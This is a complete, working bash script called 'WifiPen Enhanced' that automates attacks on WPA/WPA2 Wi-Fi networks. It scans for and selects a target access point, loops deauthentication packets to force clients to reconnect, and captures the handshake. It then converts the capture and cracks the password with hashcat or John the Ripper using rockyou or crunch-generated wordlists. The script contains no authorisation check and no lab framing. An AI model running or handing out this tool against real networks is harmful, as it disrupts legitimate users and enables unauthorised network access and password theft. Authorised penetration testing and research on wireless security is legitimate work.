#!/bin/bash

#==============================================================================
# WifiPen Enhanced - Automated WPA/WPA2 Handshake Capture & Cracking Tool
#
# This script combines network scanning, handshake capture, and password
# cracking using Hashcat and/or John the Ripper into a streamlined process.
#==============================================================================

# --- Global Variables and Configuration ---
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
NC="\e[0m"

CAPTURE_DIR="captures"
TMP_PREFIX="scan_tmp"
LOG_FILE="wifipen.log"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Global state variables
iface=""
wordlist_path=""

# --- Cleanup Function ---
# Ensures a clean exit by restoring network services and removing temp files.
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up before exit...${NC}" | tee -a "$LOG_FILE"
    
    # Terminate background processes
    if [[ -n "$CAP_PID" ]]; then
        kill -9 "$CAP_PID" 2>/dev/null
        echo "[*] Capture process ($CAP_PID) terminated." | tee -a "$LOG_FILE"
    fi
    if [[ -n "$DEAUTH_LOOP_PID" ]]; then
        kill -9 "$DEAUTH_LOOP_PID" 2>/dev/null
        echo "[*] Deauthentication process ($DEAUTH_LOOP_PID) terminated." | tee -a "$LOG_FILE"
    fi

    # Restore network interface to managed mode
    if [[ -n "$iface" ]]; then
        echo "[*] Resetting interface '$iface' to managed mode..." | tee -a "$LOG_FILE"
        ip link set "$iface" down 2>/dev/null
        iw "$iface" set type managed 2>/dev/null
        ip link set "$iface" up 2>/dev/null
    fi

    # Remove temporary scan files
    rm -f "${TMP_PREFIX}-*.csv" "${TMP_PREFIX}-*.cap" "${TMP_PREFIX}-*.pcapng" "${TMP_PREFIX}-*.netxml"
    echo "[*] Temporary files removed." | tee -a "$LOG_FILE"
    echo -e "${GREEN}[+] Cleanup complete.${NC}" | tee -a "$LOG_FILE"
    exit 130 # Standard exit code for Ctrl+C
}

# Set trap to call the cleanup function on script interruption or termination
trap cleanup SIGINT SIGTERM

# --- Core Functions ---

# Function to check for required tools and offer installation
check_dependencies() {
    echo -e "${YELLOW}[*] Checking for required dependencies...${NC}" | tee -a "$LOG_FILE"
    local required_tools=(airmon-ng airodump-ng aireplay-ng iw crunch hashcat hcxpcapngtool john git make gcc python3)
    local missing_tools=()

    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing_tools+=("$tool")
        fi
    done

    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing tools: ${missing_tools[*]}${NC}" | tee -a "$LOG_FILE"
        read -p "Do you want to try and install them now? (y/n): " choice
        if [[ "$choice" == "y" ]]; then
            # Update package list
            echo -e "${YELLOW}[*] Updating package list...${NC}"
            apt-get update -y
            
            # Install packages using apt
            echo -e "${YELLOW}[*] Installing packages...${NC}"
            apt-get install -y aircrack-ng crunch hashcat hcxtools john git build-essential python3
        else
            echo -e "${RED}[!] Dependencies not met. Exiting.${NC}"
            exit 1
        fi
    fi

    # Verify John the Ripper supports WPA-PSK
    if ! john --list=formats 2>/dev/null | grep -q "wpapsk"; then
        echo -e "${YELLOW}[!] System's John the Ripper lacks 'wpapsk' support.${NC}"
        read -p "Build and install John the Ripper (Jumbo) from source? (y/n): " build_john
        if [[ "$build_john" == "y" ]]; then
            echo "[*] Cloning John the Ripper from GitHub..."
            git clone https://github.com/openwall/john.git /opt/john-jumbo
            cd /opt/john-jumbo/src
            echo "[*] Configuring and building... this may take a while."
            ./configure && make -s clean && make -sj"$(nproc)"
            echo "[*] Build complete. The new 'john' binary is in /opt/john-jumbo/run/"
            export PATH="/opt/john-jumbo/run:$PATH"
        fi
    fi

    echo -e "${GREEN}[+] All dependencies are satisfied.${NC}" | tee -a "$LOG_FILE"
}

# Function to prepare the rockyou.txt wordlist if it's compressed
prepare_rockyou() {
    local rockyou_path="/usr/share/wordlists/rockyou.txt"
    local rockyou_gz_path="${rockyou_path}.gz"
    if [ ! -f "$rockyou_path" ] && [ -f "$rockyou_gz_path" ]; then
        echo -e "${YELLOW}[!] 'rockyou.txt' is not extracted.${NC}"
        read -p "Do you want to extract it now? (This requires sudo) (y/n): " choice
        if [[ "$choice" == "y" ]]; then
            echo "[*] Extracting '$rockyou_gz_path'..."
            gzip -d "$rockyou_gz_path"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}[+] 'rockyou.txt' extracted successfully.${NC}"
            else
                echo -e "${RED}[!] Failed to extract wordlist.${NC}"
            fi
        fi
    fi
}

# Function to let the user select a wordlist to use for cracking
select_wordlist() {
    prepare_rockyou # Check if rockyou needs extraction first
    
    local default_wordlist="/usr/share/wordlists/rockyou.txt"
    echo -n "Enter the full path to your wordlist (default: $default_wordlist): "
    read -r input_path

    if [[ -z "$input_path" ]]; then
        input_path="$default_wordlist"
    fi

    if [[ ! -f "$input_path" ]]; then
        echo -e "${RED}[!] Wordlist not found at '$input_path'.${NC}" | tee -a "$LOG_FILE"
        wordlist_path="" # Clear the path if invalid
    else
        wordlist_path="$input_path"
        echo -e "${GREEN}[+] Wordlist set to: $wordlist_path${NC}" | tee -a "$LOG_FILE"
    fi
}

# Function to create a custom wordlist using crunch with parallel processing
create_wordlist() {
    echo -e "${YELLOW}[*] Creating a custom wordlist with crunch...${NC}"
    read -p "Enter a prefix (e.g., 'wifi123'; must be < 8 chars): " prefix
    if (( ${#prefix} >= 8 )); then
        echo -e "${RED}[!] Prefix must be less than 8 characters.${NC}"; return;
    fi

    read -p "Enter minimum password length (>= ${#prefix}): " min
    read -p "Enter maximum password length (>= $min): " max
    
    if (( min < ${#prefix} || max < min )); then
        echo -e "${RED}[!] Invalid length requirements.${NC}"; return;
    fi

    read -p "Enter a name for the output file (e.g., 'my_list.txt'): " wordlist_file
    local output_path="$SCRIPT_DIR/$wordlist_file"
    
    echo -e "${YELLOW}[*] Generating wordlist from length $min to $max in parallel...${NC}" | tee -a "$LOG_FILE"
    
    local tmp_crunch_dir="$SCRIPT_DIR/crunch_tmp"
    mkdir -p "$tmp_crunch_dir"
    
    for ((l = min; l <= max; l++)); do
        local pattern="$prefix"
        local pad_len=$((l - ${#prefix}))
        for ((i = 0; i < pad_len; i++)); do pattern+='@'; done
        
        # Run each crunch instance in the background
        crunch "$l" "$l" -t "$pattern" -o "$tmp_crunch_dir/part_$l.txt" &
    done
    
    echo -e "${YELLOW}[*] Waiting for all crunch processes to finish...${NC}"
    wait
    
    echo -e "${YELLOW}[*] Merging parts into the final file...${NC}"
    cat "$tmp_crunch_dir"/part_*.txt > "$output_path"
    rm -rf "$tmp_crunch_dir"
    
    echo -e "${GREEN}[+] Wordlist saved to '$output_path'.${NC}" | tee -a "$LOG_FILE"
    wordlist_path="$output_path" # Automatically select the newly created list
}

# The main attack function: select interface, scan, capture, and crack
attack_workflow() {
    # 1. Select Interface
    local interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wireless interfaces found. Aborting.${NC}"; return;
    fi
    echo -e "${GREEN}Available wireless interfaces:${NC}"
    select opt in "${interfaces[@]}"; do
        if [[ -n "$opt" ]]; then
            iface="$opt"; break;
        else
            echo -e "${RED}Invalid selection. Try again.${NC}";
        fi
    done
    echo -e "${GREEN}[+] Using interface: $iface${NC}"

    # 2. Enable Monitor Mode
    echo -e "${YELLOW}[*] Enabling monitor mode on '$iface'...${NC}"
    ip link set "$iface" down
    iw "$iface" set monitor control
    ip link set "$iface" up
    echo -e "${GREEN}[+] Monitor mode enabled.${NC}"

    # 3. Scan for Networks
    echo -e "${YELLOW}[*] Scanning for networks (15 seconds)...${NC}"
    airodump-ng -w "$TMP_PREFIX" --output-format csv "$iface" --write-interval 5 &> /dev/null &
    local scan_pid=$!
    sleep 15
    kill -9 $scan_pid 2>/dev/null

    local ap_list=()
    local csv_file="${TMP_PREFIX}-01.csv"
    if [ ! -f "$csv_file" ]; then
        echo -e "${RED}[!] Scan failed. No networks found.${NC}"; return;
    fi
    
    # Read networks from CSV into an array
    while IFS=, read -r bssid _ _ _ channel _ _ _ _ _ _ _ _ essid _; do
        if [[ "$bssid" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] && [[ -n "$essid" ]]; then
            ap_list+=("$bssid|$channel|$essid")
        fi
    done < <(grep -a . "$csv_file")
    
    if [ ${#ap_list[@]} -eq 0 ]; then
        echo -e "${RED}[!] No access points found in scan results.${NC}"; return;
    fi

    # 4. Select Target
    echo -e "\n${GREEN}Available Networks:${NC}"
    for i in "${!ap_list[@]}"; do
        IFS='|' read -r bssid channel essid <<< "${ap_list[$i]}"
        printf "%2d) ESSID: %-20s | BSSID: %s | CH: %s\n" "$((i+1))" "$essid" "$bssid" "$channel"
    done
    
    read -p "Select the target AP number: " choice
    local target_info="${ap_list[$((choice-1))]}"
    IFS='|' read -r bssid channel essid <<< "$target_info"
    
    echo -n "Enter a name for the capture file (e.g., 'office_wifi'): "; read -r filename
    mkdir -p "$CAPTURE_DIR"
    local cap_base="$CAPTURE_DIR/$filename"

    # 5. Capture Handshake
    echo -e "${YELLOW}[*] Capturing handshake for ESSID: $essid on channel $channel...${NC}"
    airodump-ng --bssid "$bssid" -c "$channel" -w "$cap_base" --output-format pcapng "$iface" > "$LOG_FILE" 2>&1 &
    CAP_PID=$!
    
    sleep 3
    echo -e "${YELLOW}[*] Sending deauth packets to speed up capture. Press Ctrl+C to stop capture.${NC}"
    ( while kill -0 $CAP_PID 2>/dev/null; do
        aireplay-ng --deauth 5 -a "$bssid" "$iface" >/dev/null 2>&1
        sleep 5
    done ) & DEAUTH_LOOP_PID=$!
    
    echo -e "${YELLOW}[*] Watching for WPA handshake...${NC}"
    while : ; do
        if grep -q "WPA handshake: $bssid" "$LOG_FILE"; then
            echo -e "\n${GREEN}[+] WPA Handshake captured!${NC}" | tee -a "$LOG_FILE"
            break
        fi
        echo -n "."
        sleep 2
    done
    
    # Stop capture processes
    kill -9 "$CAP_PID" "$DEAUTH_LOOP_PID" 2>/dev/null
    wait "$CAP_PID" 2>/dev/null # Wait to ensure file is written

    # 6. Convert and Crack
    local pcap_file
    pcap_file=$(ls -t "${cap_base}"-*.pcapng 2>/dev/null | head -n1)
    if [[ ! -f "$pcap_file" ]]; then
        echo -e "${RED}[!] Capture file not found. Attack may have failed.${NC}"; return;
    fi
    
    echo -e "${YELLOW}[*] Converting capture to Hashcat format (.hc22000)...${NC}"
    local hc22000_file="${pcap_file%.pcapng}.hc22000"
    hcxpcapngtool -o "$hc22000_file" "$pcap_file" &> /dev/null
    
    if [ ! -s "$hc22000_file" ]; then
        echo -e "${RED}[!] Failed to convert handshake. No valid EAPOL pairs found.${NC}"; return;
    fi

    echo -e "${GREEN}[+] Handshake converted to $hc22000_file${NC}"

    # 7. Cracking Menu
    if [[ -z "$wordlist_path" ]]; then
        echo -e "${RED}[!] No wordlist selected! Please select a wordlist from the main menu first.${NC}"; return;
    fi
    
    echo
    echo "--- Cracking Menu ---"
    echo "1) Crack with Hashcat"
    echo "2) Crack with John the Ripper"
    echo "3) Crack with Both"
    echo "4) Skip cracking"
    read -p "Select a cracking method: " crack_choice
    
    case $crack_choice in
        1)
            echo -e "${YELLOW}[*] Starting Hashcat...${NC}"
            hashcat -m 22000 "$hc22000_file" "$wordlist_path" --force
            echo -e "\n${GREEN}[+] Hashcat finished. Showing cracked passwords:${NC}"
            hashcat -m 22000 "$hc22000_file" --show
            ;;
        2)
            echo -e "${YELLOW}[*] Starting John the Ripper...${NC}"
            # Ensure John has the path if custom build was used
            export PATH="/opt/john-jumbo/run:$PATH"
            john --wordlist="$wordlist_path" --format=wpapsk "$hc22000_file"
            echo -e "\n${GREEN}[+] John finished. Showing cracked passwords:${NC}"
            john --show "$hc22000_file"
            ;;
        3)
            echo -e "${YELLOW}[*] Starting Hashcat...${NC}"
            hashcat -m 22000 "$hc22000_file" "$wordlist_path" --force
            echo -e "\n${YELLOW}[*] Starting John the Ripper...${NC}"
            export PATH="/opt/john-jumbo/run:$PATH"
            john --wordlist="$wordlist_path" --format=wpapsk "$hc22000_file"
            
            echo -e "\n${GREEN}[+] Cracking finished. Showing results:${NC}"
            echo "--- Hashcat Results ---"
            hashcat -m 22000 "$hc22000_file" --show
            echo "--- John The Ripper Results ---"
            john --show "$hc22000_file"
            ;;
        *) echo "[*] Skipping cracking step." ;;
    esac
}


# --- Main Menu and Script Entry ---

main_menu() {
    while true; do
        clear
        echo "==================== WifiPen Enhanced Menu ===================="
        echo -e "  ${YELLOW}Current Wordlist:${NC} ${wordlist_path:-Not Set}"
        echo "---------------------------------------------------------------"
        echo "  1) Check/Install Dependencies"
        echo "  2) Create Custom Wordlist"
        echo "  3) Select Wordlist (e.g., rockyou.txt)"
        echo "  4) Launch Attack (Capture & Crack)"
        echo "  5) Exit"
        echo "==============================================================="
        read -p "Select an option: " opt
        
        case $opt in
            1) check_dependencies ;;
            2) create_wordlist ;;
            3) select_wordlist ;;
            4) attack_workflow ;;
            5) echo "Exiting. Goodbye!"; exit 0 ;;
            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
        esac
        echo -e "\n${YELLOW}Press Enter to return to the menu...${NC}"
        read -r
    done
}

# --- Script Start ---
# Initial root check
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root. Please use sudo.${NC}" 
   exit 1
fi

clear
# Set a default wordlist on start if possible
select_wordlist
main_menu